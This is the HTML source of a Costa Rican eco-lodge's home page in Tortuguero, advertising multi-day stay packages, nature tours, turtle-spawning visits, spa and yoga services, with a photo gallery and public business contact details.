			<h4 style="text-align: center;"><strong>CHOOSE THE EXPERIENCE YOU WANT TO LIVE IN TORTUGUERO</strong></h4>

		</div>
	</div>
</div></div></div><div class="wpb_column vc_column_container vc_col-sm-6"><div class="vc_column-inner "><div class="wpb_wrapper"><div class="vc-hoverbox-wrapper  vc_custom_1600121510084 wpb_animate_when_almost_visible wpb_fadeIn fadeIn vc-hoverbox-shape--rounded vc-hoverbox-align--left vc-hoverbox-direction--default vc-hoverbox-width--100" >
  <div class="vc-hoverbox">
    <div class="vc-hoverbox-inner">
      <div class="vc-hoverbox-block vc-hoverbox-front" style="background-image: url(/resources/uploads/2020/05/simple.jpg);">
        <div class="vc-hoverbox-block-inner vc-hoverbox-front-inner">
            <h2 style="font-size: 40px;color: #dbf9ff;line-height: 1;text-align: center;font-family:Cinzel;font-weight:700;font-style:normal" class="vc_custom_heading wpb_animate_when_almost_visible wpb_fadeIn fadeIn" >Two days / one-night</h2>
        </div>
      </div>
      <div class="vc-hoverbox-block vc-hoverbox-back" style="background-color: #2f990c;">
        <div class="vc-hoverbox-block-inner vc-hoverbox-back-inner">
            
            <p><strong><span style="color: #ffffff;">We have an experience waiting for you</span></strong></p>

            <div class="vc_btn3-container vc_btn3-center" >
	<a class="vc_general vc_btn3 vc_btn3-size-md vc_btn3-shape-rounded vc_btn3-style-3d vc_btn3-block vc_btn3-color-turquoise" href="/2-days-1-night.html" title="2 days / 1 night">More Info</a></div>

        </div>
      </div>
    </div>
  </div>
</div></div></div></div><div class="wpb_column vc_column_container vc_col-sm-6"><div class="vc_column-inner "><div class="wpb_wrapper"><div class="vc-hoverbox-wrapper  vc_custom_1600121522943 wpb_animate_when_almost_visible wpb_fadeIn fadeIn vc-hoverbox-shape--rounded vc-hoverbox-align--left vc-hoverbox-direction--default vc-hoverbox-width--100" >
  <div class="vc-hoverbox">
    <div class="vc-hoverbox-inner">
      <div class="vc-hoverbox-block vc-hoverbox-front" style="background-image: url(/resources/uploads/2019/11/cama-individual-1024x683.png);">
        <div class="vc-hoverbox-block-inner vc-hoverbox-front-inner">
            <h2 style="font-size: 35px;color: #dbf9ff;line-height: 1;text-align: center;font-family:Cinzel;font-weight:700;font-style:normal" class="vc_custom_heading wpb_animate_when_almost_visible wpb_fadeIn fadeIn" >Three days and / two nights</h2>
        </div>
      </div>
      <div class="vc-hoverbox-block vc-hoverbox-back" style="background-color: #046072;">
        <div class="vc-hoverbox-block-inner vc-hoverbox-back-inner">
            
            <p><span style="color: #ffffff;"><strong>We have an experience waiting for you</strong></span></p>

            <div class="vc_btn3-container vc_btn3-center" >
	<a class="vc_general vc_btn3 vc_btn3-size-md vc_btn3-shape-rounded vc_btn3-style-3d vc_btn3-block vc_btn3-color-turquoise" href="3-days-2-nights.html" title="3 days 2 nights">More Info</a></div>

        </div>
      </div>
    </div>
  </div>
</div></div></div></div><div class="wpb_column vc_column_container vc_col-sm-6"><div class="vc_column-inner "><div class="wpb_wrapper"><div class="vc-hoverbox-wrapper  vc_custom_1600121550585 wpb_animate_when_almost_visible wpb_fadeIn fadeIn vc-hoverbox-shape--rounded vc-hoverbox-align--left vc-hoverbox-direction--default vc-hoverbox-width--100" >
  <div class="vc-hoverbox">
    <div class="vc-hoverbox-inner">
      <div class="vc-hoverbox-block vc-hoverbox-front" style="background-image: url(/resources/uploads/2019/11/4nigths.png);">
        <div class="vc-hoverbox-block-inner vc-hoverbox-front-inner">
            <h2 style="font-size: 40px;color: #dbf9ff;line-height: 1;text-align: center;font-family:Cinzel;font-weight:700;font-style:normal" class="vc_custom_heading wpb_animate_when_almost_visible wpb_fadeIn fadeIn" >Four days and / three nights</h2>
        </div>
      </div>
      <div class="vc-hoverbox-block vc-hoverbox-back" style="background-color: #2f990c;">
        <div class="vc-hoverbox-block-inner vc-hoverbox-back-inner">
            
            <p><strong><span style="color: #ffffff;">We have an experience waiting for you</span></strong></p>

            <div class="vc_btn3-container vc_btn3-center" >
	<a class="vc_general vc_btn3 vc_btn3-size-md vc_btn3-shape-rounded vc_btn3-style-3d vc_btn3-block vc_btn3-color-turquoise" href="3-days-2-nights-2.html" title="4 days 3 nights">More Info</a></div>

        </div>
      </div>
    </div>
  </div>
</div></div></div></div><div class="wpb_column vc_column_container vc_col-sm-6"><div class="vc_column-inner "><div class="wpb_wrapper"><div class="vc-hoverbox-wrapper  vc_custom_1600121566473 wpb_animate_when_almost_visible wpb_fadeIn fadeIn vc-hoverbox-shape--rounded vc-hoverbox-align--left vc-hoverbox-direction--default vc-hoverbox-width--100" >
  <div class="vc-hoverbox">
    <div class="vc-hoverbox-inner">
      <div class="vc-hoverbox-block vc-hoverbox-front" style="background-image: url(/resources/uploads/2019/11/cama-individual-1024x683.png);">
        <div class="vc-hoverbox-block-inner vc-hoverbox-front-inner">
            <h2 style="font-size: 35px;color: #dbf9ff;line-height: 1;text-align: center;font-family:Cinzel;font-weight:700;font-style:normal" class="vc_custom_heading wpb_animate_when_almost_visible wpb_fadeIn fadeIn" >Five days / four nights</h2>
        </div>
      </div>
      <div class="vc-hoverbox-block vc-hoverbox-back" style="background-color: #046072;">
        <div class="vc-hoverbox-block-inner vc-hoverbox-back-inner">
            
            <p><span style="color: #ffffff;"><strong>We have an experience waiting for you</strong></span></p>

            <div class="vc_btn3-container vc_btn3-center" >
	<a class="vc_general vc_btn3 vc_btn3-size-md vc_btn3-shape-rounded vc_btn3-style-3d vc_btn3-block vc_btn3-color-turquoise" href="five-days-four-nights.html" title="5 days 4 nights">More Info</a></div>

        </div>
      </div>
    </div>
  </div>
</div></div></div></div><div class="wpb_column vc_column_container vc_col-sm-12"><div class="vc_column-inner "><div class="wpb_wrapper"><div class="vc_empty_space"   style="height: 15px" ><span class="vc_empty_space_inner"></span></div>
</div></div></div></div></section><div class="vc_row wpb_row vc_row-fluid">

<div class="wpb_column vc_column_container vc_col-sm-4"><div class="vc_column-inner "><div class="wpb_wrapper"><h3 style="font-size: 35px;color: #206842;line-height: bold;text-align: center;font-family:Cinzel;font-weight:700;font-style:normal" class="vc_custom_heading wpb_animate_when_almost_visible wpb_fadeIn fadeIn" >About us</h3><div class="vc_separator wpb_content_element vc_separator_align_center vc_sep_width_100 vc_sep_border_width_3 vc_sep_pos_align_center vc_separator_no_text vc_sep_color_green" ><span class="vc_sep_holder vc_sep_holder_l"><span  class="vc_sep_line"></span></span><span class="vc_sep_holder vc_sep_holder_r"><span  class="vc_sep_line"></span></span>
</div><div class="vc_empty_space"   style="height: 5px" ><span class="vc_empty_space_inner"></span></div>

	<div class="wpb_text_column wpb_content_element " >
		<div class="wpb_wrapper">
			<p>Strategically located in front of the main lagoon, just 5 minutes by boat from the National Tortuguero Park and 3 minutes from the picturesque town by the same name.</p>

		</div>
	</div>
<div class="awe-btn-container awe-btn-inline"><a class="awe-btn awe-btn-medium awe-btn-outline" href="lodge-2.html" title="Pachira Lodge hotel" style="color:;border-color:;">Read more</a></div><div class="vc_empty_space"   style="height: 30px" ><span class="vc_empty_space_inner"></span></div>
</div></div></div><div class="wpb_column vc_column_container vc_col-sm-8"><div class="vc_column-inner vc_custom_1570930651217"><div class="wpb_wrapper"><div class="vc_empty_space"   style="height: 60px" ><span class="vc_empty_space_inner"></span></div>

		<div class="awe-video" data-init="video" >
			<div class="awe-video__img" data-init="customstyle">
				<img width="1275" height="768" src="/resources/uploads/2019/11/vuieo.png" class="attachment-full size-full" alt="" decoding="async" srcset="/resources/uploads/2019/11/vuieo.png 1275w, /resources/uploads/2019/11/vuieo-300x181.png 300w, /resources/uploads/2019/11/vuieo-768x463.png 768w, /resources/uploads/2019/11/vuieo-1024x617.png 1024w" sizes="(max-width: 1275px) 100vw, 1275px" />				<a class="video" href="https://www.youtube.com/watch?v=LmvThwsrqDA">
					<span class="awe-video__play play-video" title="Hotel Pachira Lodge">
						<i class="awe-video-icon  sonora-icon-media-play"></i>
					</span>
				</a>
				
			</div>


		</div>
		</div></div></div></div><div class="vc_row wpb_row vc_row-fluid">

<div class="wpb_column vc_column_container vc_col-sm-12"><div class="vc_column-inner "><div class="wpb_wrapper"><div class="vc_empty_space"   style="height: 30px" ><span class="vc_empty_space_inner"></span></div>

	<div class="wpb_text_column wpb_content_element " >
		<div class="wpb_wrapper">
			<p>From July to September, some years until October,  you will be able to observe the impressive spectacle that nature offers with the arrival of the Green sea turtles (Chelonia mydas) to spawn; world famous.</p>

		</div>
	</div>
<div class="vc_empty_space"   style="height: 30px" ><span class="vc_empty_space_inner"></span></div>
<div class="vc_separator wpb_content_element vc_separator_align_center vc_sep_width_100 vc_sep_border_width_3 vc_sep_pos_align_center vc_separator_no_text vc_sep_color_green" ><span class="vc_sep_holder vc_sep_holder_l"><span  class="vc_sep_line"></span></span><span class="vc_sep_holder vc_sep_holder_r"><span  class="vc_sep_line"></span></span>
</div>

</div></div></div></div><div data-vc-full-width="true" data-vc-full-width-init="false" data-vc-stretch-content="true" class="vc_row wpb_row vc_row-fluid vc_custom_1668551160671 vc_row-has-fill">

<div class="wpb_column vc_column_container vc_col-sm-12"><div class="vc_column-inner "><div class="wpb_wrapper"><div class="vc_separator wpb_content_element vc_separator_align_center vc_sep_width_100 vc_sep_border_width_3 vc_sep_pos_align_center vc_separator_no_text vc_sep_color_green" ><span class="vc_sep_holder vc_sep_holder_l"><span  class="vc_sep_line"></span></span><span class="vc_sep_holder vc_sep_holder_r"><span  class="vc_sep_line"></span></span>
</div><h2 style="font-size: 45px;color: #206842;line-height: bold;text-align: center;font-family:Cinzel;font-weight:700;font-style:normal" class="vc_custom_heading wpb_animate_when_almost_visible wpb_fadeIn fadeIn" >ADDITIONAL TOURS AND SERVICES</h2></div></div></div>



<div class="wpb_column vc_column_container vc_col-sm-4"><div class="vc_column-inner "><div class="wpb_wrapper"><div class="vc-hoverbox-wrapper vc_custom_1599430813297 wpb_animate_when_almost_visible wpb_fadeIn fadeIn vc-hoverbox-shape--rounded vc-hoverbox-align--left vc-hoverbox-direction--default vc-hoverbox-width--100 wpb_start_animation animated">
  <div class="vc-hoverbox" style="perspective: 1905.33px;">
    <div class="vc-hoverbox-inner" style="min-height: 250px;">
      <div class="vc-hoverbox-block vc-hoverbox-front" style="background-image: url(/resources/uploads/morning.jpg);">
        <div class="vc-hoverbox-block-inner vc-hoverbox-front-inner">
            
        </div>
      </div>
      <div class="vc-hoverbox-block vc-hoverbox-back" style="background-color: #6dab3c;">
        <div class="vc-hoverbox-block-inner vc-hoverbox-back-inner">
            <h2 style="text-align:center">Morning Tour</h2>
            
            <div class="vc_btn3-container vc_btn3-inline">
	<a class="vc_general vc_btn3 vc_btn3-size-lg vc_btn3-shape-rounded vc_btn3-style-modern vc_btn3-icon-left vc_btn3-color-turquoise" href="/morning-tour.html" title=""><i class="vc_btn3-icon fa fa-ship"></i> More info</a></div>

        </div>
      </div>
    </div>
  </div>
</div></div></div></div>
<div class="wpb_column vc_column_container vc_col-sm-4"><div class="vc_column-inner "><div class="wpb_wrapper"><div class="vc-hoverbox-wrapper vc_custom_1599430813297 wpb_animate_when_almost_visible wpb_fadeIn fadeIn vc-hoverbox-shape--rounded vc-hoverbox-align--left vc-hoverbox-direction--default vc-hoverbox-width--100 wpb_start_animation animated">
  <div class="vc-hoverbox" style="perspective: 1905.33px;">
    <div class="vc-hoverbox-inner" style="min-height: 250px;">
      <div class="vc-hoverbox-block vc-hoverbox-front" style="background-image: url(/resources/uploads/walk.jpg);">
        <div class="vc-hoverbox-block-inner vc-hoverbox-front-inner">
            
        </div>
      </div>
      <div class="vc-hoverbox-block vc-hoverbox-back" style="background-color: #6dab3c;">
        <div class="vc-hoverbox-block-inner vc-hoverbox-back-inner">
            <h2 style="text-align:center">Night Walk Tour</h2>
            
            <div class="vc_btn3-container vc_btn3-inline">
	<a class="vc_general vc_btn3 vc_btn3-size-lg vc_btn3-shape-rounded vc_btn3-style-modern vc_btn3-icon-left vc_btn3-color-turquoise" href="/night-walk.html" title="Hiking Tour"><i class="vc_btn3-icon fa fa-ship"></i> More info</a></div>

        </div>
      </div>
    </div>
  </div>
</div></div></div></div>

<div class="wpb_column vc_column_container vc_col-sm-4"><div class="vc_column-inner "><div class="wpb_wrapper"><div class="vc-hoverbox-wrapper vc_custom_1599430813297 wpb_animate_when_almost_visible wpb_fadeIn fadeIn vc-hoverbox-shape--rounded vc-hoverbox-align--left vc-hoverbox-direction--default vc-hoverbox-width--100 wpb_start_animation animated">
  <div class="vc-hoverbox" style="perspective: 1905.33px;">
    <div class="vc-hoverbox-inner" style="min-height: 250px;">
      <div class="vc-hoverbox-block vc-hoverbox-front" style="background-image: url(/resources/uploads/hiking.jpg);">
        <div class="vc-hoverbox-block-inner vc-hoverbox-front-inner">
            
        </div>
      </div>
      <div class="vc-hoverbox-block vc-hoverbox-back" style="background-color: #6dab3c;">
        <div class="vc-hoverbox-block-inner vc-hoverbox-back-inner">
            <h2 style="text-align:center">Hiking Tour</h2>
            
            <div class="vc_btn3-container vc_btn3-inline">
	<a class="vc_general vc_btn3 vc_btn3-size-lg vc_btn3-shape-rounded vc_btn3-style-modern vc_btn3-icon-left vc_btn3-color-turquoise" href="/hiking-tour.html" title="Hiking Tour"><i class="vc_btn3-icon fa fa-ship"></i> More info</a></div>

        </div>
      </div>
    </div>
  </div>
</div></div></div></div>

<div class="wpb_column vc_column_container vc_col-sm-4"><div class="vc_column-inner "><div class="wpb_wrapper"><div class="vc-hoverbox-wrapper  vc_custom_1600126686760 wpb_animate_when_almost_visible wpb_fadeIn fadeIn vc-hoverbox-shape--rounded vc-hoverbox-align--left vc-hoverbox-direction--default vc-hoverbox-width--100" >
  <div class="vc-hoverbox">
    <div class="vc-hoverbox-inner">
      <div class="vc-hoverbox-block vc-hoverbox-front" style="background-image: url(/resources/uploads/2019/11/Hover_inicio__0000_pachira_photos_0009_p.giocoso-0211-Costa-Rica-Tortuguero-049.jpg.png);">
        <div class="vc-hoverbox-block-inner vc-hoverbox-front-inner">
            
        </div>
      </div>
      <div class="vc-hoverbox-block vc-hoverbox-back" style="background-color: #6dab3c;">
        <div class="vc-hoverbox-block-inner vc-hoverbox-back-inner">
            <h2 style="text-align:center">SPAWNING</h2>
            
            <div class="vc_btn3-container vc_btn3-inline" >
	<a class="vc_general vc_btn3 vc_btn3-size-md vc_btn3-shape-rounded vc_btn3-style-modern vc_btn3-color-turquoise" href="spawning.html" title="Recorrido en bote al amanecer">More info</a></div>

        </div>
      </div>
    </div>
  </div>
  
</div></div></div></div><div class="wpb_column vc_column_container vc_col-sm-4"><div class="vc_column-inner "><div class="wpb_wrapper"><div class="vc-hoverbox-wrapper  vc_custom_1602029276325 wpb_animate_when_almost_visible wpb_fadeIn fadeIn vc-hoverbox-shape--rounded vc-hoverbox-align--left vc-hoverbox-direction--default vc-hoverbox-width--100" >
  <div class="vc-hoverbox">
    <div class="vc-hoverbox-inner">
      <div class="vc-hoverbox-block vc-hoverbox-front" style="background-image: url(/resources/uploads/2020/10/spa-ingles.png);">
        <div class="vc-hoverbox-block-inner vc-hoverbox-front-inner">
            
        </div>
      </div>
      <div class="vc-hoverbox-block vc-hoverbox-back" style="background-color: #6dab3c;">
        <div class="vc-hoverbox-block-inner vc-hoverbox-back-inner">
            <h2 style="text-align:center">SPA SERVICES</h2>
            
            <div class="vc_btn3-container vc_btn3-inline" >
	<a class="vc_general vc_btn3 vc_btn3-size-md vc_btn3-shape-rounded vc_btn3-style-modern vc_btn3-color-turquoise" href="spa-3-2.html" title="spa services">More info</a></div>

        </div>
      </div>
    </div>
  </div>
  
  
  </div></div></div></div><div class="wpb_column vc_column_container vc_col-sm-4"><div class="vc_column-inner "><div class="wpb_wrapper"><div class="vc-hoverbox-wrapper  vc_custom_1602029276325 wpb_animate_when_almost_visible wpb_fadeIn fadeIn vc-hoverbox-shape--rounded vc-hoverbox-align--left vc-hoverbox-direction--default vc-hoverbox-width--100" >
  <div class="vc-hoverbox">
    <div class="vc-hoverbox-inner">
      <div class="vc-hoverbox-block vc-hoverbox-front" style="background-image: url(/resources/uploads/yoga.jpg);">
        <div class="vc-hoverbox-block-inner vc-hoverbox-front-inner">
            
        </div>
      </div>
      <div class="vc-hoverbox-block vc-hoverbox-back" style="background-color: #6dab3c;">
        <div class="vc-hoverbox-block-inner vc-hoverbox-back-inner">
            <h2 style="text-align:center">YOGA</h2>
            
            <div class="vc_btn3-container vc_btn3-inline" >
	<a class="vc_general vc_btn3 vc_btn3-size-md vc_btn3-shape-rounded vc_btn3-style-modern vc_btn3-color-turquoise" href="yoga.html" title="yoga services">More info</a></div>

        </div>
      </div>
    </div>
  </div>
  
</div></div></div></div><div class="wpb_column vc_column_container vc_col-sm-12"><div class="vc_column-inner "><div class="wpb_wrapper"><div class="vc_empty_space"   style="height: 32px" ><span class="vc_empty_space_inner"></span></div>
</div></div></div></div><div class="vc_row-full-width">

</div>

<div data-vc-full-width="true" data-vc-full-width-init="true" data-vc-stretch-content="true" class="vc_row wpb_row vc_row-fluid vc_custom_1668551160671 vc_row-has-fill" style="position: relative; left: -314.6px; box-sizing: border-box; width: 1519px;">
    
    <center> <h2 style="font-size: 56px;">Gallery</h2></center>
    
<div class="ful-img" id="fulImgBox">
        <img src="/resources/uploads/2020/07/gallery/1.jpg" id="fulImg" alt="">
        <span onclick="closeImg()">X</span>
    </div>

    <div class="img-gallery">
        <img src="/resources/uploads/2020/07/gallery/1.jpg" onclick="openFulImg(this.src)" alt="">
        
        <img src=" /resources/uploads/2020/07/gallery/2.jpg" onclick="openFulImg(this.src)" alt="">
        <img src=" /resources/uploads/2020/07/gallery/3.jpg" onclick="openFulImg(this.src)" alt="">
        <img src=" /resources/uploads/2020/07/gallery/4.jpg" onclick="openFulImg(this.src)" alt="">
        <img src="/resources/uploads/2020/07/gallery/5.jpg" onclick="openFulImg(this.src)" alt="">
        <img src="/resources/uploads/2020/07/gallery/6.jpg" onclick="openFulImg(this.src)" alt="">
        <img src=" /resources/uploads/2020/07/gallery/7.jpg" onclick="openFulImg(this.src)" alt="">
        <img src=" /resources/uploads/2020/07/gallery/8.jpg" onclick="openFulImg(this.src)" alt="">
        
        <img src=" /resources/uploads/2020/07/gallery/9.jpg" onclick="openFulImg(this.src)" alt="">
        <img src=" /resources/uploads/2020/07/gallery/10.jpg" onclick="openFulImg(this.src)" alt="">
        <img src=" /resources/uploads/2020/07/gallery/_DSC3280.jpg" onclick="openFulImg(this.src)" alt="">
       <!--< <img src=" /resources/uploads/2020/07/gallery/12.jpg" onclick="openFulImg(this.src)" alt="">
        <img src=" /resources/uploads/2020/07/gallery/13.jpg" onclick="openFulImg(this.src)" alt="">-->
        <img src=" /resources/uploads/2020/07/gallery/14.jpg" onclick="openFulImg(this.src)" alt="">
        <!--<img src=" /resources/uploads/2020/07/gallery/15.jpg" onclick="openFulImg(this.src)" alt="">-->
        <img src=" /resources/uploads/2020/07/gallery/16.jpg" onclick="openFulImg(this.src)" alt="">
        
        <img src=" /resources/uploads/2020/07/gallery/17.jpg" onclick="openFulImg(this.src)" alt="">
        <img src=" /resources/uploads/2020/07/gallery/_DSC33912.jpg" onclick="openFulImg(this.src)" alt="">
        <img src=" /resources/uploads/2020/07/gallery/18.jpg" onclick="openFulImg(this.src)" alt="">
        <img src=" /resources/uploads/2020/07/gallery/19.jpg" onclick="openFulImg(this.src)" alt="">
        <img src=" /resources/uploads/2020/07/gallery/20.jpg" onclick="openFulImg(this.src)" alt="">
        <img src=" /resources/uploads/2020/07/gallery/_DSC34931.jpg" onclick="openFulImg(this.src)" alt="">
        <img src=" /resources/uploads/2020/07/gallery/22.jpg" onclick="openFulImg(this.src)" alt="">
        <!--<img src=" /resources/uploads/2020/07/gallery/24.jpg" onclick="openFulImg(this.src)" alt="">
        <img src=" /resources/uploads/2020/07/gallery/25.jpg" onclick="openFulImg(this.src)" alt="">-->
        <img src=" /resources/uploads/2020/07/gallery/26.jpg" onclick="openFulImg(this.src)" alt="">
      <!--  <img src=" /resources/uploads/2020/07/gallery/27.jpg" onclick="openFulImg(this.src)" alt="">-->
    </div>


</div>
<div class="vc_row-full-width">

</div><section class="vc_section"><div class="vc_row wpb_row vc_row-fluid">

<div class="wpb_column vc_column_container vc_col-sm-12"><div class="vc_column-inner "><div class="wpb_wrapper"><h2 style="font-size: 30px;color: #005335;text-align: center;font-family:Cinzel;font-weight:700;font-style:normal" class="vc_custom_heading" >We are part of</h2><div class="vc_separator wpb_content_element vc_separator_align_center vc_sep_width_100 vc_sep_border_width_2 vc_sep_pos_align_center vc_separator_no_text vc_sep_color_turquoise" ><span class="vc_sep_holder vc_sep_holder_l"><span  class="vc_sep_line"></span></span><span class="vc_sep_holder vc_sep_holder_r"><span  class="vc_sep_line"></span></span>
</div></div></div></div></div><div class="vc_row wpb_row vc_row-fluid">

<div class="wpb_column vc_column_container vc_col-sm-1/5"><div class="vc_column-inner "><div class="wpb_wrapper">
	<div  class="wpb_single_image wpb_content_element vc_align_center">
		
		<figure class="wpb_wrapper vc_figure">
			<div class="vc_single_image-wrapper   vc_box_border_grey"><img class="vc_single_image-img " src="/resources/uploads/2019/11/prtectim-them.png" width="150" height="150" alt="prtectim-them" title="prtectim-them" /></div>
		</figure>
	</div>

	<div  class="wpb_single_image wpb_content_element vc_align_center">
		
		<figure class="wpb_wrapper vc_figure">
			<div class="vc_single_image-wrapper   vc_box_border_grey"><img class="vc_single_image-img " src="/resources/uploads/2020/09/Untitled-2_0000_go-tours-1.png" width="91" height="96" alt="Untitled-2_0000_go-tours" title="Untitled-2_0000_go-tours" /></div>
		</figure>
	</div>
</div></div></div><div class="wpb_column vc_column_container vc_col-sm-1/5"><div class="vc_column-inner "><div class="wpb_wrapper">
	

	<div  class="wpb_single_image wpb_content_element vc_align_center">
		
		<figure class="wpb_wrapper vc_figure">
			<div class="vc_single_image-wrapper   vc_box_border_grey"><img class="vc_single_image-img " src="/resources/uploads/2020/09/Untitled-2_0002_Proimagen-1.png" width="100" height="41" alt="Untitled-2_0002_Proimagen" title="Untitled-2_0002_Proimagen" /></div>
		</figure>
	</div>

	<div  class="wpb_single_image wpb_content_element vc_align_center">
		
		<figure class="wpb_wrapper vc_figure">
			<div class="vc_single_image-wrapper   vc_box_border_grey"><img class="vc_single_image-img " src="/resources/uploads/2020/09/Untitled-1_0000_trip-avisor.png" width="100" height="100" alt="Untitled-1_0000_trip-avisor" title="Untitled-1_0000_trip-avisor" /></div>
		</figure>
	</div>
</div></div></div><div class="wpb_column vc_column_container vc_col-sm-1/5"><div class="vc_column-inner "><div class="wpb_wrapper">
	<div  class="wpb_single_image wpb_content_element vc_align_center">
		
		<figure class="wpb_wrapper vc_figure">
			<div class="vc_single_image-wrapper   vc_box_border_grey"><img class="vc_single_image-img " src="/resources/uploads/2019/11/Untitled-1_0003_futuropa.png" width="100" height="100" alt="Untitled-1_0003_futuropa" title="Untitled-1_0003_futuropa" /></div>
		</figure>
	</div>

	<div  class="wpb_single_image wpb_content_element vc_align_center">
		
		<figure class="wpb_wrapper vc_figure">
			<div class="vc_single_image-wrapper   vc_box_border_grey"><img class="vc_single_image-img " src="/resources/uploads/2020/09/Untitled-2_0005_findingpepper.png" width="89" height="87" alt="Untitled-2_0005_findingpepper" title="Untitled-2_0005_findingpepper" /></div>
		</figure>
	</div>

	<div  class="wpb_single_image wpb_content_element vc_align_center">
		
		<figure class="wpb_wrapper vc_figure">
			<div class="vc_single_image-wrapper   vc_box_border_grey"><img class="vc_single_image-img " src="/resources/uploads/2019/11/pgrupo-pachira.png" width="150" height="150" alt="pgrupo-pachira" title="pgrupo-pachira" /></div>
		</figure>
	</div>
</div></div></div><div class="wpb_column vc_column_container vc_col-sm-1/5"><div class="vc_column-inner "><div class="wpb_wrapper">
	<div  class="wpb_single_image wpb_content_element vc_align_center">
		
		<figure class="wpb_wrapper vc_figure">
			<div class="vc_single_image-wrapper   vc_box_border_grey"><img class="vc_single_image-img " src="/resources/uploads/2019/11/Untitled-1_0004_cch.png" width="100" height="100" alt="Untitled-1_0004_cch" title="Untitled-1_0004_cch" /></div>
		</figure>
	</div>



	<div  class="wpb_single_image wpb_content_element vc_align_center">
		
		<figure class="wpb_wrapper vc_figure">
			<div class="vc_single_image-wrapper   vc_box_border_grey"><img class="vc_single_image-img " src="/resources/uploads/2020/09/Untitled-2_0004_Camara-de-hoteles.png" width="94" height="94" alt="Untitled-2_0004_Cámara-de-hoteles" title="Untitled-2_0004_Cámara-de-hoteles" /></div>
		</figure>
	</div>
</div></div></div><div class="wpb_column vc_column_container vc_col-sm-1/5"><div class="vc_column-inner "><div class="wpb_wrapper">
	<div  class="wpb_single_image wpb_content_element vc_align_center">
		
		<figure class="wpb_wrapper vc_figure">
			<div class="vc_single_image-wrapper   vc_box_border_grey"><img class="vc_single_image-img " src="/resources/uploads/2019/11/Untitled-1_0005_canatur.png" width="100" height="100" alt="Untitled-1_0005_canatur" title="Untitled-1_0005_canatur" /></div>
		</figure>
	</div>

	<div  class="wpb_single_image wpb_content_element vc_align_center">
		
		<figure class="wpb_wrapper vc_figure">
			<div class="vc_single_image-wrapper   vc_box_border_grey"><img class="vc_single_image-img " src="/resources/uploads/2019/11/costa-rica.png" width="150" height="150" alt="costa-rica" title="costa-rica" /></div>
		</figure>
	</div>
</div></div></div></div></section>
        </div>
    </article>
                <div class="page-link clearfix">
                                    </div>
                                            </div>
</div>
<!-- END / BLOG NORMAL-->
            <!-- FOOTER -->
            <a href="https://api.whatsapp.com/send?phone=50622578830&text=Can%20you%20give%20me%20more%20information%3F" target="_blank"><img class="btn-whatsapp" src="/resources/whatsapp.webp" width="64" height="64" alt="Whatsapp"></a>
            
            <footer id="footer"
                    class="footer " >

                <!-- FOOTER TOP -->
                                <!-- END / FOOTER TOP -->

                
                                                                                    <!-- FOOTER CENTER -->
                        <div class="footer_center">
                            <div class="container">
                                <div class="row">

                                    
                                                                                    <div class="col-xs-12 col-sm-4">
                                                <aside id="block-7" class="widget widget_block widget_text">
                                                  
<p>Central: <a href="tel:+50622572242" data-type="tel" data-id="tel:+50622572242">(+506) 2257-2242</a></p>
</aside><aside id="block-9" class="widget widget_block widget_text">
<p>Servicio Cliente: <a href="tel:+50622578830" data-type="tel" data-id="tel:+50622578830">(+506) 2257-8830</a></p>
</aside><aside id="block-10" class="widget widget_block widget_text">
    <p>Operations: <a href="tel:+50622578830" data-type="tel" data-id="tel:+50622578830">(+506) 8830-9956</a></p>
</aside><aside id="block-10" class="widget widget_block widget_text">
<p>Hotel: <a href="tel:+50627098172" data-type="tel" data-id="tel:+50627098172">(+506) 2709-8172</a></p>
</aside>                                            </div>
                                                                                    <div class="col-xs-12 col-sm-4">
                                                                                     
                                                <aside id="block-7" class="widget widget_block widget_text">
<p class="has-text-align-left"><a href="mailto:info@pachiralodge.com">info@pachiralodge.com</a></p>
</aside><aside id="block-8" class="widget widget_block widget_text">
<p class="has-text-align-left">Tortuguero, Costa Rica</p>
</aside>                                            </div>

<div class="col-xs-12 col-sm-4">

<aside id="block-7" class="widget widget_block widget_text">
<a href="/tortuguero-2.html">Tortuguero</a><br/>
<a href="/lodge-2.html">Lodge</a><br/>
<a href="/hotel_locacion-2.html">Location</a><br/>
<a href="/tours-additional.html">Additional Tours</a><br/>
<a href="/frequently-asked-questions.html">FQA</a><br/>
<a href="/contact.html">Contact Us</a><br/>
</aside>
</div>
                                        
                                    
                                </div>
                            </div>
                        </div>
                        <!-- END / FOOTER CENTER -->
                                    
                                    <!-- FOOTER BOTTOM -->
                    <div class="footer_bottom">
                        <div class="container">
                            <div class="inner">
                                <div class="row">
                                                                                                                                                                <
                                                                            <div class="footer_bottom--column col-xs-12 col-sm-4">
                                                                                            <div class="footer_bottom__social">
                                                    <a href="https://www.facebook.com/pages/category/Hotel-Resort/pachira-lodge-105911009460357/" target="_blank"><i class="fa fa-facebook fa-2x"></i></a><a href="https://instagram.com/pachiralodge?igshid=x6q2lm3r4xcg" target="_blank"><i class="fa fa-instagram fa-2x"></i></a>
<a href="https://api.whatsapp.com/send?phone=50622578830&text=Can%20you%20give%20me%20more%20information%3F" target="_blank"><i class="fa fa-whatsapp fa-2x"></i></a>                                                </div>
                                                                                    </div>
                                    
                                                                            <div class="footer_bottom--column text-right pr-25 col-xs-12 col-sm-4">
                                            <div class="footer_bottom__pm">
                                                <img src="resources/themes/Theme-Packages/sonora/assets/images/payment.png"
                                                     alt="Hotel Pachira Lodge">
                                            </div>
                                        </div>
                                                                    </div>
                            </div>
                        </div>
                    </div>
                    <!-- END / FOOTER BOTTOM -->
                
            </footer>
            <!-- END / FOOTER -->
            </div>
<!-- END / PAGE WRAP -->
<!--noptimize--><!--email_off--><style type='text/css'>.maxbutton-3.maxbutton.maxbutton-book-now{position:relative;text-decoration:none;display:inline-block;vertical-align:middle;width:250px;height:45px;border:2px solid rgba(98, 247, 113, 0);border-radius:4px 4px 4px 4px;background-color:#70c43c;box-shadow:0px 0px 2px 0px #333333}.maxbutton-3.maxbutton.maxbutton-book-now:hover{border-color:#70c43c;background-color:rgba(255, 255, 255, 0);box-shadow:0px 0px 2px 0px #333333}.maxbutton-3.maxbutton.maxbutton-book-now .mb-text{color:#ffffff;font-size:17px;text-align:center;font-style:normal;font-weight:bold;line-height:1em;box-sizing:border-box;display:block;background-color:unset;padding:13px 0px 0px 0px}.maxbutton-3.maxbutton.maxbutton-book-now:hover .mb-text{color:#70c43c}@media only screen and (min-width:0px) and (max-width:480px){.maxbutton-3.maxbutton.maxbutton-book-now{width:90%}.maxbutton-3.maxbutton.maxbutton-book-now .mb-text{font-size:13px}}
